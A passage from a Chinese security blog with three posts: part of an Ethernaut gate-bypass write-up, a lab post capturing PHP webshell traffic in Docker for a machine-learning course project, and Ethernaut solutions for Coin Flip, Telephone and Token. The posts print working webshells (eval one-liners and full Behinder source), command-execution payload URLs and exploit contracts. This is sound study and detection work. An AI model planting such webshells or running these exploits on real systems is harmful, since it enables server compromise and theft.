<h4 id="重复声明与作用域"><a href="#重复声明与作用域" class="headerlink" title="重复声明与作用域"></a>重复声明与作用域</h4><p>网上某个题解的 payload ， 能打通，但是有个天大的坑；</p>
<p>先贴代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function exploit() public &#123;</span><br><span class="line">       // 后四位是metamask上账户地址的低2个字节</span><br><span class="line">       bytes8 key=0xAAAAAAAA00004261;</span><br><span class="line">       bool result;</span><br><span class="line">       for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">           (bool result, bytes memory data) = address(</span><br><span class="line">               target</span><br><span class="line">           ).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">           if (result) &#123;</span><br><span class="line">               break;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       emit log(uint32(uint64(key)) == uint16(uint64(key)));</span><br><span class="line">       emit log(uint32(uint64(key)) != uint64(key));</span><br><span class="line">       emit log(uint32(uint64(key)) == uint16((address(tx.origin))));</span><br><span class="line">       emit log(result);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>问题很明显，<code>for</code>循环里面把<code>result</code>又声明了一遍，导致循环代码块里面的<code>result</code>和外面的不是一个，外面的会被赋缺省值<code>false</code>，且无论攻击有没有成功<code>log</code>都是<code>false</code>；</p>
<p>他这里<code>bytes8</code>处理的没问题，攻击是可以成功的，但我当时 copy 了这个代码下来跑几次，<code>log</code>输出都是<code>false</code>，误以为攻击失败了，怀疑人生，又开始改循环数目，多折腾了很久；</p>
<h2 id="人机"><a href="#人机" class="headerlink" title="人机"></a>人机</h2><p>好早啊；</p>
<p>夏天的风我永远记得，清清楚楚的说你爱我。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/02/2024-09-02-webshell%20%E6%8A%93%E5%8C%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/02/2024-09-02-webshell%20%E6%8A%93%E5%8C%85/" class="post-title-link" itemprop="url">webshell 抓包</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-02 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-02T00:00:00+08:00">2024-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-15 15:02:56" itemprop="dateModified" datetime="2024-09-15T15:02:56+08:00">2024-09-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="webshell-抓包"><a href="#webshell-抓包" class="headerlink" title="webshell 抓包"></a>webshell 抓包</h1><p>小学期“网络安全课程设计”做了一个机器学习流量分析的选题，组内大佬结合我主业，发配我负责采集 PHPwebshell 流量；</p>
<p><img src="https://i.imgur.com/QvSKkWe.png"></p>
<p><img src="https://i.imgur.com/wmNLyw6.png"></p>
<p>两个问题：</p>
<ol>
<li>我想用 docker 部署靶机环境，如何用 wireshark 抓 docker 流量，没干过；</li>
<li>https 没配过；</li>
</ol>
<p>思路是用 docker 起一个 php 环境，配好 https ，然后分别去连几种 webshell ，抓下流量；</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="起镜像"><a href="#起镜像" class="headerlink" title="起镜像"></a>起镜像</h3><p><strong>镜像版本</strong>：<code>docker pull php:8.4-rc-apache-bullseye</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-d</span> <span class="literal">-p</span> <span class="number">9000</span>:<span class="number">80</span> <span class="literal">-p</span> <span class="number">9001</span>:<span class="number">443</span> `</span><br><span class="line"><span class="literal">-v</span> D:/works/traffics/<span class="number">240902</span>webshelltraffics/html:/var/www/html `</span><br><span class="line"><span class="literal">--name</span> webshell<span class="literal">-traffic</span> php:<span class="number">8.4</span><span class="literal">-rc-apache-bullseye</span></span><br></pre></td></tr></table></figure>

<p>映射一下，方便传马（多此一举了其实）；</p>
<h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> /var/www/html/index.php</span><br></pre></td></tr></table></figure>

<p> 访问 9000 端口，检测到空文件，成功；</p>
<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h3 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h3><p>首先安装<code>tcpdump</code>，用于抓包；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w /tmp/capture.pcap</span><br></pre></td></tr></table></figure>

<p>把包保存到<code>/tmp</code>里；</p>
<p>访问几次<code>index.php</code>，保存流量；</p>
<p>copy 到本机，然后打开查看；</p>
<p><img src="https://i.imgur.com/K0S5zcU.png"></p>
<p>然后配置<code>https</code>加密流量，同样的方法抓；</p>
<h4 id="https-配置"><a href="#https-配置" class="headerlink" title="https 配置"></a>https 配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 ssl</span></span><br><span class="line">a2enmod ssl</span><br><span class="line"><span class="comment"># 创建 ssl 目录</span></span><br><span class="line"><span class="built_in">mkdir</span> /etc/apache2/ssl</span><br><span class="line"><span class="comment"># 生成自签名证书</span></span><br><span class="line">openssl req -x509 -nodes -days 365 \</span><br><span class="line">    -newkey rsa:2048 \</span><br><span class="line">    -keyout /etc/apache2/ssl/apache.key \</span><br><span class="line">    -out /etc/apache2/ssl/apache.crt \</span><br><span class="line">    -subj <span class="string">&quot;/C=US/ST=State/L=City/O=Organization/OU=Department/CN=localhost&quot;</span></span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/apache2/sites-available/default-ssl.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;\n&lt;VirtualHost *:443&gt;\n\</span><br><span class="line">    DocumentRoot /var/www/html\n\</span><br><span class="line">    SSLEngine on\n\</span><br><span class="line">    SSLCertificateFile /etc/apache2/ssl/apache.crt\n\</span><br><span class="line">    SSLCertificateKeyFile /etc/apache2/ssl/apache.key\n\</span><br><span class="line">&lt;/VirtualHost&gt;\n&quot; &gt;&gt; /etc/apache2/sites-available/default-ssl.conf</span><br></pre></td></tr></table></figure>

<p>启用配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a2ensite default-ssl.conf</span><br></pre></td></tr></table></figure>

<p>访问<code>https://localhost:9001/</code>成功；</p>
<h3 id="传统-webshell"><a href="#传统-webshell" class="headerlink" title="传统 webshell"></a>传统 webshell</h3><p><strong>basic-webshell.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;QST&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<p><code>https://localhost:9001/basic-webshell.php?QST=echo(exec(%27whoami%27));</code></p>
<p><code>https://localhost:9001/basic-webshell.php?QST=echo(exec(%27ls%27));</code></p>
<p>可以看到一些 https 的特征：</p>
<p><img src="https://i.imgur.com/Xe2hAm2.png"></p>
<h3 id="Antsword（蚁剑）"><a href="#Antsword（蚁剑）" class="headerlink" title="Antsword（蚁剑）"></a>Antsword（蚁剑）</h3><p><strong>antsword-webshell.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;QST&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>连接webshell：</p>
<p><img src="https://i.imgur.com/Rh6NtrJ.png"></p>
<p>在操作 webshell 过程中抓包；</p>
<p>这里有个问题，我的自签名 ssl 证书在用蚁剑连的时候会报：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;DEPTH_ZERO_SELF_SIGNED_CERT&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>忽略 https 证书即可；</p>
<p><img src="https://i.imgur.com/Lvvqqu6.png"></p>
<p>随便点点，抓到一些包：</p>
<p><img src="https://i.imgur.com/Z9HjKWI.png"></p>
<p><img src="https://i.imgur.com/OZtdCHG.png"></p>
<p>特征差不多；</p>
<h3 id="Behinder（冰蝎）"><a href="#Behinder（冰蝎）" class="headerlink" title="Behinder（冰蝎）"></a>Behinder（冰蝎）</h3><p><strong>behinder-webshell.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;f14b485168197a68&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，连接密码QST</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样，操作 webshell 同时抓包：</p>
<p><img src="https://i.imgur.com/MQWTQyD.png"></p>
<p>比之前的包大一两个数量级；</p>
<p><img src="https://i.imgur.com/mm5DFiT.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>抓了一些常用的 webshell ，希望有用。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/08/30/2024-08-30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/30/2024-08-30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/" class="post-title-link" itemprop="url">区块链学习之壹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-08-30 00:00:00" itemprop="dateCreated datePublished" datetime="2024-08-30T00:00:00+08:00">2024-08-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:16:52" itemprop="dateModified" datetime="2024-09-19T21:16:52+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链学习之壹"><a href="#区块链学习之壹" class="headerlink" title="区块链学习之壹"></a>区块链学习之壹</h1><h2 id="ethernaut-Coin-Flip"><a href="#ethernaut-Coin-Flip" class="headerlink" title="ethernaut - Coin Flip"></a>ethernaut - Coin Flip</h2><p>投币咯，我最喜欢的；</p>
<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p> 随机的核心在于 <code>blockhash(block.number - 1)</code>；</p>
<p>攻击原理是，如果在攻击合约中调用目标合约，就可以让两次调用在一个 block ，从而两次伪随机的结果相同；</p>
<p>注意<code>lastHash == blockValue</code>是不允许的，这事实上限制了不能连续在同一 block 内调用<code>flip</code> ；</p>
<p>解决方案是运行十次 exp ，而不是在 exp 中调用十次<code>flip</code>；</p>
<p><strong>source of exp contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=0.8.2 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title Storage</span><br><span class="line"> * @dev Store &amp; retrieve value in a variable</span><br><span class="line"> * @custom:dev-run-script ./scripts/deploy_with_ethers.ts</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">// interface for instancing the problem contract</span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">    function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// accacking contract</span><br><span class="line">contract Storage &#123;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    address instance = 0xb9A0C84D1C4a44322a141b401b95a69dCE386dC4;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    CoinFlip con;</span><br><span class="line">    </span><br><span class="line">    function exp() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // calculate which side</span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        </span><br><span class="line">        // call con.flip </span><br><span class="line">        con = CoinFlip(instance);</span><br><span class="line">        con.flip(side);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>部署合约，调十次 <code>exp</code> 即可；</p>
<h3 id="使用-Remix-Injected-Provider-编写-attacking-contract"><a href="#使用-Remix-Injected-Provider-编写-attacking-contract" class="headerlink" title="使用 Remix - Injected Provider 编写 attacking contract"></a>使用 Remix - Injected Provider 编写 attacking contract</h3><p>一，写代码到<code>contracts/xxx.sol</code>，开启自动编译；</p>
<p><img src="https://i.imgur.com/Wu8TWiZ.png"></p>
<p><img src="https://i.imgur.com/0eofV8w.png"></p>
<p>二，选择环境 <code>Injected Provider</code>，选择要部署的合约；</p>
<p><img src="https://i.imgur.com/y6K2gag.png"></p>
<p>三，部署；</p>
<p><img src="https://i.imgur.com/FQMcmy6.png"></p>
<p>四，调用<code>exp</code>函数；</p>
<p><img src="https://i.imgur.com/ZGnM4Hx.png"></p>
<p>这样就完成了一个简单 attacking contract 的部署到调用；</p>
<h2 id="ethernaut-Telephone"><a href="#ethernaut-Telephone" class="headerlink" title="ethernaut - Telephone"></a>ethernaut - Telephone</h2><p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="difference-between-msg-sender-tx-origin"><a href="#difference-between-msg-sender-tx-origin" class="headerlink" title="difference between msg.sender&amp;tx.origin"></a>difference between msg.sender&amp;tx.origin</h3><p><img src="https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg"></p>
<p>很直观了，<code>msg.sender</code>是功能的调用者，<code>tx.origin</code>调用功能的账户；</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>只需要用一个非<code>player</code>的合约调用<code>instance</code>即可；</p>
<p><strong>exp source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external ;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function exp() public &#123;</span><br><span class="line">        Telephone t = Telephone(0x7433a6f73fA68a0ED229e4164F4D6503ffF0a489);</span><br><span class="line">        t.changeOwner(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ethernaut-Token"><a href="#ethernaut-Token" class="headerlink" title="ethernaut - Token"></a>ethernaut - Token</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//The goal of this level is for you to hack the basic token contract below.</span><br><span class="line"></span><br><span class="line">//You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</span><br><span class="line"></span><br><span class="line">//  Things that might help:</span><br><span class="line"></span><br><span class="line">//What is an odometer?</span><br></pre></td></tr></table></figure>

<p>要求把自己余额弄成一个很大的数；</p>
<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="What-is-an-odometer"><a href="#What-is-an-odometer" class="headerlink" title="What is an odometer?"></a>What is an odometer?</h3><p>说实话没懂这个hint；</p>
<h3 id="uint-overflow"><a href="#uint-overflow" class="headerlink" title="uint overflow"></a>uint overflow</h3><p><code>transfer</code> 表面上限制了余额不能为负数：<code>require(balances[msg.sender] - _value &gt;= 0)</code>；</p>
<p>但是<code>balances</code>的键值实际上是<code>uint256</code>，查阅 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/types.html#id8">solidity 官方文档</a> 得知两点：</p>
<ol>
<li>“Solidity中的整数是有取值范围的。 例如 <code>uint32</code> 类型的取值范围是 <code>0</code> 到 <code>2 ** 32-1</code> 。 0.8.0 开始，算术运算有两个计算模式：一个是 “wrapping”（截断）模式或称 “unchecked”（不检查）模式，一个是”checked” （检查）模式。 默认情况下，算术运算在 “checked” 模式下，即都会进行溢出检查，如果结果落在取值范围之外，调用会通过 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/control-structures.html#assert-and-require">失败异常</a> 回退。 你也可以通过 <code>unchecked &#123; ... &#125;</code> 切换到 “unchecked”模式，更多可参考 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/control-structures.html#unchecked">unchecked</a> .”</li>
